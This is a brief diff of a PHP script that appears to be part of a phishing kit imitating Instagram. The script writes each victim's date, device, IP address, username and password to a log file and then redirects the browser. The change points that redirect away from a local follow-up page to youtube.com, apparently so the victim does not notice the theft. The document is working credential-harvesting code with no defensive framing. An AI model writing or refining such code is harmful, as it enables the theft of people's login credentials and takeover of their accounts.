@@ -11,5 +11,5 @@ $handler=fopen($file, 'a+');
 $data="Date : $dt\nDevice:$dev\nIP :$ip\nUsername: $user\nPassword:$pass\n=================================================================\n";
 fwrite($handler, $data);
 fclose($handler);
-echo '<script> window.location="http://localhost/myinsta/second.php"</script>'
+echo '<script> window.location="https://www.youtube.com"</script>'
 ?>
